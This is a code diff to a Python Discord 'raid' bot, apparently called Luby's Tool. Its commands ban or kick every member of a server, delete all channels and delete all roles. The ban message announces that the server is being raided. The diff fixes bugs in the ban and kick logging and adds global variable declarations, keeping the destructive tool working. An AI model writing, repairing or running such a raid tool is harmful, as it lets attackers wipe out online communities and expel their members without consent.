@@ -24,6 +24,8 @@ async def on_ready():
 #bans all members     
 @bot.command()
 async def members(ctx):
+    global bans
+    global kicks
     reason = "The server gets currently raided with Luby's Tool"
     message = f"You have been banned from {ctx.guild.name}, {reason}"
     members = []
@@ -38,18 +40,19 @@ async def members(ctx):
             pass
         try:
             await ctx.guild.ban(member, reason=reason)
-            bans.append(member.user)
+            bans.append(member.name)
             await ctx.channel.send(f"{member} is banned!")
         except:
             try:
                 await ctx.guild.kick(member, reason=reason)
-                kicks.append(member.user)
+                kicks.append(member.name)
                 await ctx.channel.send(f"{member} is kicked!")
             except:
                 pass
 #deletes all channels and creats one
 @bot.command()
 async def channels(ctx):
+    global deletes
     text_channel_list = []
     for channel in ctx.guild.channels:
         text_channel_list.append(channel)
@@ -63,6 +66,7 @@ async def channels(ctx):
 #deletes all roles and creates a new one
 @bot.command()
 async def roles(ctx):
+    global droles
     roles = []
     for role in ctx.guild.roles:
         roles.append(role)
